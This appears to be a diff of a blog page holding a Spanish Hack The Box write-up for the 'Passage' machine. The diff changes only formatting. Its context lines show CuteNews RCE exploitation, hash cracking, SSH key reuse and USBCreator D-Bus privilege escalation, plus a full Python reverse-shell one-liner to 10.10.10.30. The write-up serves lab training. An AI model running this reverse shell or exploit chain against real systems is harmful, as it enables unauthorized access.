@@ -568,7 +568,7 @@
     
     var enableSearchHighlight = JSON.parse("true");
     
-    var searchResultPosition = JSON.parse("\"side\"");
+    var searchResultPosition = JSON.parse("\"main\"");
     
     var sectionType = JSON.parse("\"posts\"");
     
@@ -1578,11 +1578,14 @@
   🏷️
   
 
-  <li><a href="https://sckull.github.io/tags/rce/" class="single__tag" title="rce">#rce</a></li>
+  <li><a href="https://sckull.github.io/tags/rce/" class="single__tag" title="rce">rce</a></li>
+  
 
-  <li><a href="https://sckull.github.io/tags/cute-news-cms/" class="single__tag" title="cute news cms">#cute news cms</a></li>
+  <li><a href="https://sckull.github.io/tags/cute-news-cms/" class="single__tag" title="cute news cms">cute news cms</a></li>
+  
 
-  <li><a href="https://sckull.github.io/tags/usbcreator-d-bus/" class="single__tag" title="usbcreator d bus">#usbcreator d bus</a></li>
+  <li><a href="https://sckull.github.io/tags/usbcreator-d-bus/" class="single__tag" title="usbcreator d bus">usbcreator d bus</a></li>
+  
 
 </ul>
     </div>
@@ -1601,7 +1604,7 @@
     <img src="/images/posts/htb/passage/cover.png" alt="featured image" class="featured-image" style="width: ;height: ;">
   </div>
 
-<h3 id="informacion-de-la-maquina">Informacion de la Maquina</h3>
+<h1 id="informacion-de-la-maquina">Informacion de la Maquina</h1>
 <table>
 <thead>
 <tr>
@@ -1632,7 +1635,7 @@
 </tr>
 </tbody>
 </table>
-<h2 id="nmap-">NMAP</h2>
+<h1 id="nmap">NMAP</h1>
 <p>Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1696,11 +1699,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 <span class="c1"># Nmap done at Fri Sep 25 01:34:55 2020 -- 1 IP address (1 host up) scanned in 10.77 seconds</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="http-">HTTP</h2>
+</div><h1 id="http">HTTP</h1>
 <p>Encontramos una pagina web en el puerto 80.<br />
 <img src="/images/posts/htb/passage/Screenshot_20200925_020921.png" alt="" /></p>
 <p>Al intentar realizar una busqueda directorios y paginas con gobuster parecia que la maquina habia caido, pero segun un post de la pagina tienen implementado fail2ban, por lo que al utilizar herramientas como gobuster o hydra, fail2ban banea nuestra IP por algun tiempo.</p>
-<h2 id="cute-news-212---rce-">CUTE NEWS 2.1.2 - RCE</h2>
+<h1 id="cute-news-212---rce">CUTE NEWS 2.1.2 - RCE</h1>
 <p>Explorando la pagina encontramos en el footer de esta el nombre de lo que parece ser un CMS, al investigar un poco acerca de este nombre encontramos un exploit <a href="https://www.exploit-db.com/exploits/48800"><strong>CuteNews 2.1.2 - Remote Code Execution</strong></a>.</p>
 <p><img src="/images/posts/htb/passage/Screenshot_20200925_021143.png" alt="" /></p>
 <p>Segun el codigo del exploit realiza una consulta a <code>/CuteNews/cdata/users/lines</code> donde se almacenan en <code>base64</code> las credenciales de usuarios, verificamos que esta direccion exista en esta version de CMS y vemos la lista de usuarios codificados.</p>
@@ -1817,7 +1820,7 @@ www-data
 <pre class="chroma"><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.10.30&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
-</div><h2 id="paul---user-">PAUL - USER</h2>
+</div><h1 id="paul---user">PAUL - USER</h1>
 <p>Una vez dentro con una shell más comoda realizamos una enumeracion en la maquina pero no encontramos nada más que solo los usuarios de la maquina: <code>paul</code> y <code>nadav</code>, pero recordemos, encontramos algunos hashes (SHA256), utilizamos <code>John</code> y <code>rockyou.txt</code> para obtener algunas contraseñas.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1842,7 +1845,7 @@ f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
 <p><img src="/images/posts/htb/passage/Screenshot_20200925_022407.png" alt="" /></p>
 <p>Una vez con las contraseñas intentamos cambiar de usuario con estas, logramos obtener una shell con el usuario <code>Paul</code> y nuestra flag <code>user.txt</code>.</p>
 <p><img src="/images/posts/htb/passage/Screenshot_20200925_022737.png" alt="" /></p>
-<h2 id="nadav---user-">NADAV - USER</h2>
+<h1 id="nadav---user">NADAV - USER</h1>
 <p>Realizamos una enumeracion con este usuario y esta vez encontramos en el archivo <code>authorized_keys</code> la clave publica (id_rsa.pub) de <code>nadav</code>, por lo que este usuario puede conectarse desde su cuenta a la nuestra (paul), si ese es el caso quizas nosotros tambien a la suya.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1860,7 +1863,7 @@ paul@passage:~/.ssh$
 </div>
 </div><p>Nos conectamos mediante SSH en localhost con este usuario para comprobar que nuestro usuario (paul) tambien tenga acceso al usuario <code>nadav</code>. Lo cual pudimos confirmar y ahora tenemos una shell con <code>nadav</code>.</p>
 <p><img src="/images/posts/htb/passage/Screenshot_20200925_023306.png" alt="" /></p>
-<h2 id="privilege-escalation-">PRIVILEGE ESCALATION</h2>
+<h1 id="privilege-escalation">PRIVILEGE ESCALATION</h1>
 <p>Realizamos una enumeracion en la carpeta de <code>nadav</code> y encontramos algo interesante en el archivo <code>.viminfo</code> y es que uno de los archivos que fue editado con <code>vim</code> es <code>/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf</code>. Investigamos un poco acerca de este archivo y encontramos que es posible <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/">crear archivos como usuario <code>root</code></a> utilizando <code>USBCreator D-Bus interface</code> lo que podria ayudarnos a escalar privilegios. Para ello verificamos que <code>usb-creator-helper</code> este siendo ejecutado con el usuario <code>root</code>.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -2019,7 +2022,7 @@ nadav@passage:~$
     </div>
     <div class="whoami__desc">
       
-        Pentester |&amp; Web Dev wannabe
+        Pentester/Web Dev wannabe
       
     </div>
     <div class="whoami__social">
@@ -3284,30 +3287,17 @@ document.addEventListener('DOMContentLoaded', function () {
               HTB:  Passage
           </h6>
           
-          <label class="switch" data-ani="true">
-            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
-            <span class="slider round"></span>
-          </label>
-          
         </div>
         <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
           <nav id="TableOfContents">
   <ul>
-    <li>
-      <ul>
-        <li>
-          <ul>
-            <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
-          </ul>
-        </li>
-        <li><a href="#nmap-">NMAP</a></li>
-        <li><a href="#http-">HTTP</a></li>
-        <li><a href="#cute-news-212---rce-">CUTE NEWS 2.1.2 - RCE</a></li>
-        <li><a href="#paul---user-">PAUL - USER</a></li>
-        <li><a href="#nadav---user-">NADAV - USER</a></li>
-        <li><a href="#privilege-escalation-">PRIVILEGE ESCALATION</a></li>
-      </ul>
-    </li>
+    <li><a href="#informacion-de-la-maquina">Informacion de la Maquina</a></li>
+    <li><a href="#nmap">NMAP</a></li>
+    <li><a href="#http">HTTP</a></li>
+    <li><a href="#cute-news-212---rce">CUTE NEWS 2.1.2 - RCE</a></li>
+    <li><a href="#paul---user">PAUL - USER</a></li>
+    <li><a href="#nadav---user">NADAV - USER</a></li>
+    <li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
   </ul>
 </nav>          
         </div>
